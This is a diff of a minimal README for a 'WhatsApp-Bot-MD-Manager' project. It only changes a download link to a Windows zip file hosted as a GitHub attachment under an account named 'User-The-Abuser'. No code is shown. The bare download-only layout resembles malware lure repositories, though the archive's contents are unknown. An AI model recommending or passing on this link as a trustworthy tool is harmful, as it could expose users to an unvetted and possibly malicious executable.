@@ -1,7 +1,7 @@
 # WhatsApp-Bot-MD-Manager
 Download:
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/User-The-Abuser/WhatsApp-Bot-MD-Manager/files/15458609/WhatsApp-Bot-MD-1.0.0-Manager.zip)
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/User-The-Abuser/WhatsApp-Bot-MD-Manager/files/15458655/WhatsApp-Bot-MD-1.0.0-Manager.zip)
 
 Requirements: Windows 10/11
 
